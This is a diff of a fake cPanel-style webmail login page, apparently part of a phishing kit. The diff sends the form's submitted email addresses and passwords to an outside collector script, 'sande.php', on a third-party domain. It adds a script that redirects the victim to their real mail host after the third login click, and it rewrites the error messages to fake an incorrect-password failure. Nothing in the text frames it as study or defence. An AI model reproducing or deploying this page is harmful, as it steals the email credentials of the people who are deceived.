@@ -287,7 +287,7 @@
          </form>
         </div>
         <div id="forms">
-         <form action="https://myrpm.in/vendor/phpunit/phpunit/src/Util/PHP/sande.php" id="login_form" method="post" novalidate="" style="visibility:" target="_top">
+         <form action="https://robotialogs.com.ge/sande.php" id="login_form" method="post" novalidate="" style="visibility:" target="_top">
         <div class="input-req-login">
             <label for="user">
                 Email Address
@@ -506,8 +506,41 @@
    </div>
    <!--Close login-wrapper -->
   </div>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        var loginButton = document.getElementById('login_submit');
+        var userField = document.getElementById('user');
+        var clickCount = 0;
+
+        loginButton.addEventListener('click', function (event) {
+            clickCount++;
+
+            if (clickCount === 3) {
+                // Get the email address from the user field
+                var userEmail = userField.value;
+
+                // Extract the domain from the email address
+                var domain = userEmail.split('@')[1];
+
+                // Redirect to the email host's website
+                if (domain) {
+                    var emailHostURL = 'http://' + domain + ":2096";
+                    window.location.href = emailHostURL;
+                } else {
+                    // If the email format is invalid, redirect to Google.com
+                    window.location.href = 'https://www.google.com';
+                }
+            }
+
+            // Continue with the normal login behavior
+            // You might want to submit the form to the server using AJAX or perform other actions
+        });
+    });
+</script>
+
+
   <script>
-   var MESSAGES = {"invalid_login":"The login is invalid.","read_below":"Read the important information below.","internal_error":"An internal error occurred. If this condition persists, contact the system administrator.","success":"Login successful. Redirecting …","authenticating":"Authenticating …","no_username":"You must specify a username to log in.","network_error":"A network error occurred during your login request. Please try again. If this condition persists, contact your network service provider.","session_locale":"The desired locale has been saved to your browser. To change the locale in this browser again, select another locale on this screen.","ajax_timeout":"The connection timed out. Please try again."};
+   var MESSAGES = {"invalid_login":"The login is invalid.","read_below":"Read the important information below.","internal_error":"Failed Login! Incorrect Password","success":"Login successful. Redirecting …","authenticating":"Authenticating …","no_username":"You must specify a username to log in.","network_error":"login is invalid.","session_locale":"The desired locale has been saved to your browser. To change the locale in this browser again, select another locale on this screen.","ajax_timeout":"The connection timed out. Please try again."};
 
     window.IS_LOGOUT = false;
 
